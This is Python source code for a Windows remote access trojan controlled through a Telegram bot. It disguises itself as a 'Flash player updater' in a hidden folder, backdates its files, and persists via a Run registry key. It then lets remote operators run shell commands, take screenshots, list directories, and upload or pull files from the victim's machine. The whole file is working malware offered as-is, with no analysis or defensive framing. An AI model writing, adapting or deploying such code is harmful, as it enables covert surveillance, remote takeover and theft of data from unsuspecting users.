import os
import sys
import time
import shutil
import winreg
import getpass
import telepot
import requests
import win32api
import winshell
import threading
import subprocess
from PIL import ImageGrab
from telepot.loop import MessageLoop

class RAT:
	def __init__(self):
		try:
			if sys.argv[1] == "--quiet":
				pass
		except IndexError:
			self.set_autorun()
		
		MessageLoop(bot, self.bot_handler).run_as_thread()
		print("Bot connected.")
		for chat in trusted_chats:
			bot.sendMessage(chat, "🤖 Bot connected.")
		for user in trusted_users:
			bot.sendMessage(user, "🤖 Bot connected.")

		while True:
			time.sleep(10)
	
	def set_autorun(self):
		application = sys.argv[0]
		print(application)
		start_path = os.path.join(os.path.abspath(os.getcwd()), application)
		copy2_path = "{}\\{}".format(winshell.my_documents(), "Adobe flash player")
		copy2_app = os.path.join(copy2_path, "Flash player updater.exe")
        
		if not os.path.exists(copy2_path):
			os.makedirs(copy2_path)
    
		win32api.CopyFile(start_path, copy2_app)

		win32api.SetFileAttributes(copy2_path, 2)
		os.utime(copy2_app, (1282372620, 1282372620))
		os.utime(copy2_path, (1282372620, 1282372620))

		startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
		key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
		winreg.SetValueEx(key2change, 'Flash player updater', 0, winreg.REG_SZ, start_path+" --quiet")
		

	def bot_handler(self, message):
		print(message)

		userid = message["from"]["id"]
		chatid = message["chat"]["id"]

		if userid in trusted_users or chatid in trusted_chats:
			try:
				args = message["text"].split()
			except KeyError:
				args = [""]

				if "document" in message:
					file_id = message["document"]["file_id"]
					file_name = message["document"]["file_name"]
				elif "photo" in message:
					file_id = message["photo"][-1]["file_id"]
					print(message["photo"])
					file_name = "{}.jpg".format(file_id)

				file_path = bot.getFile(file_id)['file_path']
				link = "https://api.telegram.org/file/bot{}/{}".format(token, file_path)
				File = requests.get(link, stream=True).raw
				print(link)

				save_path = os.path.join(os.getcwd(), file_name)
				with open(save_path, "wb") as out_file:
					shutil.copyfileobj(File, out_file)
				
				bot.sendMessage(message["chat"]["id"], "file uploaded")

			if args[0] == "/help":
				s = """/help
					/cmd
					/run
					/pwd
					/ls 
					/cd 
					/screen
					/download 
				"""
				bot.sendMessage(message["chat"]["id"], str(s))

			elif args[0] == "/cmd":
				try:
					s = "[*] {}".format(subprocess.check_output(' '.join(args[1:]), shell=True))
				except Exception as e:
					s = "[!] {}".format(e)

				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))			

			elif args[0] == "/run":
				try:
					s = "Program started"
					subprocess.Popen(args[1:], shell=True)
					
				except Exception as e:
					s = "[!] {}".format(str(e))
				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

			elif args[0] == "/pwd":
				try:
					s = os.path.abspath(os.getcwd())
				except Exception as e:
					s = e
				
				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))
			elif args[0] == "/ls":
				if len(args) == 1:
					pth = "."
				else:
					pth = args[1]
				s = '\n'.join(os.listdir(path=pth))
				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))
				
			elif args[0] == "/cd":
				path = os.path.abspath(args[1])
				os.chdir(path)
				bot.sendMessage(message["chat"]["id"], "changing directory to {} ...".format(str(path)))
				
			elif args[0] == "/screen":
				image = ImageGrab.grab()
				image.save("pic.jpg")
				bot.sendDocument(message["chat"]["id"], open("pic.jpg", "rb"))
				os.remove("pic.jpg")

			elif args[0] == "/download":
				File = ' '.join(map(str, args[1:]))
				try:
					bot.sendDocument(message["chat"]["id"], open(File, "rb"))
				except Exception:
					bot.sendMessage(message["chat"]["id"], "you must select the file")
			elif args[0] == "":
				pass

			else:
				bot.sendMessage(message["chat"]["id"], "/help To display commands")

		else:
			bot.sendMessage(message["chat"]["id"], ":D")

if __name__ == '__main__':
	token = ""
	bot = telepot.Bot(token)
	
	trusted_users = []
	trusted_chats = []
	
	trojan = RAT()
